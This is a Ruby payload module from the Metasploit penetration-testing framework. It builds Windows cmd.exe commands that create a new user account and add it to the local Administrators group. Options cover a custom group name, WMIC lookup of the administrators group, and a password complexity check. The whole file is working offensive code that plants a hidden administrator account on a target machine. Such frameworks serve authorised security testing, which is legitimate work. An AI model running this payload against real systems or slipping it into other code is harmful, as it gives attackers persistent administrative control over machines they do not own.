# $Id: adduser.rb 15383 2012-06-03 18:16:08Z rapid7 $

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'        => 'Windows Execute net user /ADD CMD',
			'Version'     => '$Revision: 15383 $',
			'Description' => %q{
				Create a new user and add them to local administration group.

				Note: The specified password is checked for common complexity
				requirements to prevent the target machine rejecting the user
				for failing to meet policy requirements.

				Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)
			},
			'Author'      => ['hdm','scriptjunkie','Chris John Riley'],
			'License'     => MSF_LICENSE,
			'Platform'    => 'win',
			'Arch'        => ARCH_CMD,
			'Handler'     => Msf::Handler::None,
			'Session'     => Msf::Sessions::CommandShell,
			'PayloadType' => 'cmd',
			'Payload'     =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))

		register_options(
			[
				OptString.new('USER', [ true, "The username to create",     "metasploit" ]),
				OptString.new('PASS', [ true, "The password for this user", "Metasploit$1" ]),
				OptString.new('CUSTOM', [ false, "Custom group name to be used instead of default", '' ]),
				OptBool.new('WMIC',	[ true, "Use WMIC on the target to resolve administrators group", false ]),
			], self.class)

		register_advanced_options(
			[
				OptBool.new("COMPLEXITY", [ true, "Check password for complexity rules", true ]),
			], self.class)

	end

	def generate
		return super + command_string
	end

	def command_string
		user = datastore['USER'] || 'metasploit'
		pass = datastore['PASS'] || ''
		cust = datastore['CUSTOM'] || ''
		wmic = datastore['WMIC']
		complexity = datastore['COMPLEXITY']

		if(pass.length > 14)
			raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
		end

		if complexity and pass !~ /\A^.*((?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])).*$/
			raise ArgumentError, "Password: #{pass} doesn't meet complexity requirements and may cause issues"
		end

		if not cust.empty?
			print_status("Using custom group name #{cust}")
			return "cmd.exe /c net user #{user} #{pass} /ADD && " +
				"net localgroup \"#{cust}\" #{user} /ADD"
		elsif wmic
			print_status("Using WMIC to discover the administrative group name")
			return "cmd.exe /c \"FOR /F \"usebackq tokens=2* skip=1 delims==\" " +
				"%G IN (`wmic group where sid^='S-1-5-32-544' get name /Value`); do " +
				"FOR /F \"usebackq tokens=1 delims==\" %X IN (`echo %G`); do " +
				"net user #{user} #{pass} /ADD && " +
				"net localgroup \"%X\" #{user} /ADD\""
		else
			return "cmd.exe /c net user #{user} #{pass} /ADD && " +
				"net localgroup Administrators #{user} /ADD"
		end

	end
end